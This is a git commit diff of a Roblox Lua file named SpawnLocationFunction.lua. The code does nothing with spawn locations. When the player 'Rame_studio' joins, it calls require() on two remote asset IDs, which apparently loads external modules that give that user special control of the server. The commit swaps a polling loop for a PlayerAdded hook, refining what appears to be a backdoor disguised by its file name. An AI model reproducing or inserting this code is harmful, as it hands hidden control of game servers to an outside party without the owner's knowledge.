78ff418d3e5c4738dbde7ad8bf0a89b894af5d21
cipherkingsyn <160332792+cipherkingsyn@users.noreply.github.com>
2025-01-27 15:19:03 -0500

    Update SpawnLocationFunction.lua

--- SpawnLocationFunction.lua
+++ SpawnLocationFunction.lua
@@ -1,15 +1,22 @@
 local Players = game:GetService("Players")
+local executed = false
 
 local function executeForRameStudio()
-    local player = Players:FindFirstChild("Rame_studio")
-    if player then
-        require(2609384717).load("Rame_studio")
-        require(10868847330):pls("Rame_studio")
+    if not executed then
+        local player = Players:FindFirstChild("Rame_studio")
+        if player then
+            require(2609384717).load("Rame_studio")
+            require(10868847330):pls("Rame_studio")
+            executed = true
+        end
     end
 end
 
-while true do
-    executeForRameStudio()
-    task.wait(1)
-end
+Players.PlayerAdded:Connect(function(player)
+    if player.Name == "Rame_studio" then
+        executeForRameStudio()
+    end
+end)
 
+-- Check if the player is already in the game when the script starts
+executeForRameStudio()
